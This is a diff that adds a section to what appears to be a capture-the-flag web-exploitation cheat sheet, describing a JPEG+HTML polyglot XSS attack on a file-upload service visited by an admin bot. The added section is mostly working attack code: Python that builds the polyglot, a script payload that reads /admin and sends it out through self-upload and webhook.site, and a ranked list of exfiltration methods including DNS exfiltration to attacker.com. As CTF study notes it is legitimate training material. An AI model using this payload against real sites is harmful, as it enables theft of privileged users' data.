@@ -18,6 +18,7 @@
 - [DOM Clobbering + MIME Mismatch](#dom-clobbering-mime-mismatch)
 - [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
 - [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
+- [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
 - [JSFuck Decoding](#jsfuck-decoding)
 
 ---
@@ -224,6 +225,63 @@ curl -s https://target/article | grep -i "flag\|CTF{"
 **Key insight:** Many paywalls are client-side DOM overlays — the content is always in the HTML. The leetspeak hint "paywalls are just DOM" confirms this. Always try `curl` or view-source first before more complex approaches.
 
 **Detection:** Look for `<div>` elements with `position: fixed`, high `z-index`, and `backdrop-filter: blur()` in the page source — these are overlay-based paywalls.
+
+---
+
+## JPEG+HTML Polyglot XSS (EHAX 2026)
+
+**Pattern (Metadata Meyham):** File upload accepts JPEG, serves uploaded files with permissive MIME type. Admin bot visits reported files.
+
+**Attack:** Create a JPEG+HTML polyglot — valid JPEG header followed by HTML/JS payload:
+```python
+from PIL import Image
+import io
+
+# Create minimal valid JPEG
+img = Image.new('RGB', (1,1), color='red')
+buf = io.BytesIO()
+img.save(buf, 'JPEG', quality=1)
+jpeg_data = buf.getvalue()
+
+# HTML payload appended after JPEG data
+html_payload = '''<!DOCTYPE html>
+<html><body><script>
+(async function(){
+  // Fetch admin page content
+  var r = await fetch("/admin");
+  var t = await r.text();
+  // Exfiltrate via self-upload (stays on same origin)
+  var j = new Uint8Array([255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,217]);
+  var b = new Blob([j], {type:'image/jpeg'});
+  var f = new FormData();
+  f.append('file', b, 'FLAG_' + btoa(t).substring(0,100) + '.jpg');
+  await fetch('/upload', {method:'POST', body:f});
+  // Also try external webhook
+  new Image().src = "https://webhook.site/YOUR_ID?d=" + encodeURIComponent(t.substring(0,500));
+})();
+</script></body></html>'''
+
+polyglot = jpeg_data + b'\n' + html_payload.encode()
+# Upload as .html with image/jpeg content type
+```
+
+**PoW bypass:** Many CTF report endpoints require SHA-256 proof-of-work:
+```python
+import hashlib
+nonce = 0
+while True:
+    h = hashlib.sha256((challenge + str(nonce)).encode()).hexdigest()
+    if h.startswith('0' * difficulty):
+        break
+    nonce += 1
+```
+
+**Exfiltration methods (ranked by reliability):**
+1. **Self-upload:** Fetch `/admin`, upload result as filename → check `/files` for new uploads
+2. **Webhook:** `fetch('https://webhook.site/ID?flag='+data)` — may be blocked by CSP
+3. **DNS exfil:** `new Image().src = 'http://'+btoa(flag)+'.attacker.com'` — bypasses most CSP
+
+**Key insight:** JPEG files are tolerant of trailing data. Browsers parse HTML from anywhere in the response when MIME allows it. The polyglot is simultaneously a valid JPEG and valid HTML.
 
 ---
 
